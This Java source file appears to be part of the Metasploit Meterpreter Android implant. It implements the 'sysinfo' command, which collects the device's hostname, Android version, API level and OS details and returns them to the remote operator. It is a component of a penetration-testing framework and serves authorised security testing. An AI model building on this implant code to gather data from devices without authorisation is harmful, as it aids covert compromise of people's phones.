package com.metasploit.meterpreter.android;

import java.net.InetAddress;

import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.TLVType;
import com.metasploit.meterpreter.command.Command;
import com.metasploit.meterpreter.stdapi.stdapi_sys_config_sysinfo;
import android.os.Build;

public class stdapi_sys_config_sysinfo_android extends stdapi_sys_config_sysinfo implements Command {
	
	public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
		
		String androidOS = Build.VERSION.RELEASE;
		String APILevel =  Build.VERSION.SDK;
		
		response.add(TLVType.TLV_TYPE_COMPUTER_NAME, InetAddress.getLocalHost().getHostName());
		response.add(TLVType.TLV_TYPE_OS_NAME, "Android " + androidOS + " (API " + APILevel + ") - " + System.getProperty("os.name") + " " + System.getProperty("os.version") + " (" + System.getProperty("os.arch") + ")");
		return ERROR_SUCCESS;
	}
}
